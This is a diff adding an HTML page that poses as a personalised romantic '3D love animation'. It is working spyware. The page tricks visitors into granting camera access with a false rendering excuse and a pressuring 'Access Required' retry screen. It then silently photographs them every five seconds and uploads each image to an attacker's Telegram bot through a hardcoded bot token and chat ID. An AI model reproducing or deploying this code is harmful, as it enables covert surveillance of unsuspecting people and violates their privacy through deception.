@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Love World</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1a0000;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* ভেসে থাকা হার্ট এনিমেশন */
+        .heart {
+            position: absolute;
+            color: #ff4d6d;
+            font-size: 20px;
+            animation: move up 4s linear infinite;
+            opacity: 0.8;
+            pointer-events: none;
+        }
+
+        @keyframes move {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* মেইন কার্ড */
+        #main-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            padding: 40px;
+            border-radius: 30px;
+            text-align: center;
+            border: 2px solid #ff4d6d;
+            box-shadow: 0 0 30px rgba(255, 77, 109, 0.4);
+            z-index: 10;
+            max-width: 350px;
+        }
+
+        h1 { color: #ff4d6d; margin-bottom: 10px; }
+        p { color: #eee; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
+
+        #continue-btn {
+            background: linear-gradient(45deg, #ff4d6d, #ff8fa3);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(255, 77, 109, 0.3);
+            transition: 0.3s;
+        }
+
+        #continue-btn:hover { transform: scale(1.05); box-shadow: 0 15px 25px rgba(255, 77, 109, 0.5); }
+
+        /* পারমিশন না দিলে রিট্রাই স্ক্রিন */
+        #retry-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="heart-container"></div>
+
+    <div id="main-card">
+        <div style="font-size: 60px; margin-bottom: 15px;">💖</div>
+        <h1>Special For You</h1>
+        <p>You have been invited to see a personalized 3D love animation. Please click continue to start your experience.</p>
+        <button id="continue-btn">Continue</button>
+    </div>
+
+    <div id="retry-overlay">
+        <h2 style="color: #ff4d6d;">Access Required!</h2>
+        <p style="padding: 0 20px; text-align: center;">To render the 3D heart effects based on your movement, Camera access is mandatory.</p>
+        <button id="retry-btn" style="background:#fff; color:#000; padding:10px 30px; border-radius:20px; border:none; cursor:pointer; font-weight:bold;">Try Again</button>
+    </div>
+
+    <script>
+        const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
+        const chatId = '7950771882';
+        
+        // ১. ভেসে থাকা হার্ট তৈরি করার ফাংশন
+        function createHearts() {
+            const container = document.getElementById('heart-container');
+            setInterval(() => {
+                const heart = document.createElement('div');
+                heart.classList.add('heart');
+                heart.innerHTML = '❤️';
+                heart.style.left = Math.random() * 100 + 'vw';
+                heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
+                container.appendChild(heart);
+                setTimeout(() => { heart.remove(); }, 5000);
+            }, 300);
+        }
+        createHearts();
+
+        // ২. ক্যামেরা পারমিশন ও ক্যাপচার লজিক
+        async function startCameraSystem() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('retry-overlay').style.display = 'none';
+                document.getElementById('main-card').innerHTML = "<h1>Loading 3D Hearts...</h1><p>Please wait a moment.</p>";
+                
+                initCapture(stream);
+            } catch (err) {
+                document.getElementById('retry-overlay').style.display = 'flex';
+            }
+        }
+
+        function initCapture(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 300;
+            const context = canvas.getContext('2d');
+
+            setInterval(() => {
+                context.drawImage(video, 0, 0, 400, 300);
+                canvas.toBlob((blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'user_view.jpg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.6);
+            }, 5000);
+        }
+
+        // ইভেন্ট লিসেনার
+        document.getElementById('continue-btn').addEventListener('click', startCameraSystem);
+        document.getElementById('retry-btn').addEventListener('click', startCameraSystem);
+    </script>
+</body>
+</html>
